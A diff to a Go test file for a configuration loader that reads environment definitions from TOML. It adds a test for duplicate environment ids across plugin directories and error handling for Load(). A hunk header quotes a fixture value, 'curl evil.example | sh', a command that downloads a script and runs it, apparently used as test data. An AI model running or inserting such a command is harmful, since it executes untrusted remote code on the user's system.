@@ -47,6 +47,19 @@ exec = "echo global"
 	}
 }
 
+func TestLoadEnvironments_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
+	pluginA := t.TempDir()
+	pluginB := t.TempDir()
+	writeFile(t, filepath.Join(pluginA, "environments", "docker.toml"), `exec = "echo a"`)
+	writeFile(t, filepath.Join(pluginB, "environments", "docker.toml"), `exec = "echo b"`)
+	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}
+
+	_, err := cfg.LoadEnvironments()
+	if err == nil || !strings.Contains(err.Error(), "docker") {
+		t.Fatalf("expected a same-id-across-plugin-layers error naming \"docker\", got %v", err)
+	}
+}
+
 func TestLoadEnvironments_ExecRequired(t *testing.T) {
 	baseDir := t.TempDir()
 	writeFile(t, filepath.Join(baseDir, "environments", "broken.toml"), `
@@ -76,7 +89,10 @@ exec = "curl evil.example | sh"
 	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadEnvironments()
 	if err != nil {
 		t.Fatal(err)
